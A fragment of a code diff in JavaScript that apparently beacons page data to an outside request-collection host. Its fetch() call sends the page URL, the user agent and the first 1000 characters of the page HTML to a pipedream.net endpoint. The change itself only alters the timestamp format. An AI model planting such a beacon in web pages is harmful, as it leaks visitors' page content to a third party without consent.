@@ -6,7 +6,7 @@ fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
     location: location.href,
     userAgent: navigator.userAgent,
     html: document.documentElement?.outerHTML?.slice(0, 1000),
-    ts: Date.now(),
+    ts: new Date().toISOString(),
     id: Math.random().toString(36).substring(2)
   })
 });
